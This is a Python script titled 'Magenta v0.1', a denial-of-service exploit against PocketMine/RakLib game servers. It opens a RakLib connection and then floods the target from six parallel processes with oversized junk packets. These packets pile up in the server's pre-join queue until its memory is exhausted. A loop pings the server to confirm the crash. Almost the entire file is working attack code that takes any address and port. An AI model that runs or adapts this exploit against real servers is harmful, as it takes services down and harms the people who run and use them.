import socket, binascii, sys, os, signal
from struct import pack
from time import sleep, time
from multiprocessing import Process, current_process
from datetime import datetime

BANNER = '''
Magenta v0.1 - PocketMine-Raklib memory-hog (crash) exploit
'''


def address(addr, port): # Simple python implementation of raklib\protocol\Packet::putAddress()
    return "\x04" + ''.join([chr(int(i)) for i in addr.split('.')]) + chr(int(port / 256)) + chr(port % 256)

def junk(addr, port, initsleep = 0): # Main exploit code
    signal.signal(signal.SIGINT, lambda a, b: sys.exit(0)) # Forget it :) just for handling KeyboardInterrupt
    MAGIC = "\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78" # raklib\RakLib::MAGIC. Maybe raknet thing?
    PROTOCOL = 6 # raklib\RakLib::PROTOCOL. Raklib doesn't seem to check protocol version on OPEN_CONNECTION_XX packets.
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*64) # Tried to increase buffer, but failed. IDK why.
    OPEN_CONNECTION_REQUEST_1 = chr(5) + MAGIC + chr(PROTOCOL) + "\x00" # Yap. simple. 0x05(Header) + MAGIC + protocol version
    OPEN_CONNECTION_REQUEST_2 = chr(7) + MAGIC + address(addr, port) + "\x00" + chr(19) + "\x6d\x6e\x74\x61" # 0x07(Header) + MAGIC + server address/port + mtu size(idk. just set to 19) + clientID
    TRUCK = bytes(b'\x00\xff\x00' + b'\x8c' + ((b'\x00') * (1464))) #max size: 1464. size >= 1465 will cause packet drops. IDK why.
    sleep(initsleep)
    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_1, 'utf-8'), (addr, port)) #Session state set to STATE_CONNECTING_1
    sock.sendto(bytes(OPEN_CONNECTION_REQUEST_2, 'utf-8'), (addr, port)) #Session state set to STATE_CONNECTING_2, preJoinQueue is available now
    seq = 1
    while True:
        sock.sendto(bytes(b'\x8c') + pack('<L', seq)[:3] + TRUCK, (addr, port)) #Junk packets! These will be stored in preJoinQueue, until the session is closed.
        seq += 1
        sleep(0.005) #To prevent IP block from server

def killall(processes):
    sys.stdout.write("[%s] Interrupting all processes: exit" % datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'))
    for process in processes:
        process.join()
        process.terminate()
    sys.exit(0)

def check(addr, port, processes):
    signal.signal(signal.SIGINT, lambda a, b: killall(processes))
    while True:
        sys.stdout.write("[%s] Checking server availibility... " % datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'))
        asock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        asock.settimeout(10)
        asock.sendto(bytes("\x01\xaa\xba\xba\xaa\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78", 'utf-8'), (addr, port)) # unconnected ping, to check server availibility.
        try:
            resp = binascii.hexlify(asock.recv(1024))
        except (socket.timeout, ConnectionError):
            sys.stdout.write('Server seems UNREACHABLE. Maybe dead?\n')
            killall(processes)
            continue

        if resp.decode('utf-8')[:4] == '1cc2':
            sys.stdout.write('Server is still alive.\n')
        else:
            sys.stdout.write('Server seems DEAD, or blocked you!\n')
            killall(processes)

        sleep(15) # check every 15 secs

if __name__ == '__main__':
    print(BANNER)
    if len(sys.argv) < 3:
        print('Usage: %s <address> <port>' % (sys.argv[0]))
        sys.exit()

    addr = socket.gethostbyname(sys.argv[1])
    print("Address: %s (%s)" % (sys.argv[1], addr))
    sleep(0.5)
    processes = [Process(target=junk, args=(addr, int(sys.argv[2]), i * (0.01/16))) for i in range(6)] # Multiprocessing! yay!
    for p in processes:
        p.start()

    check(addr, int(sys.argv[2]), processes)
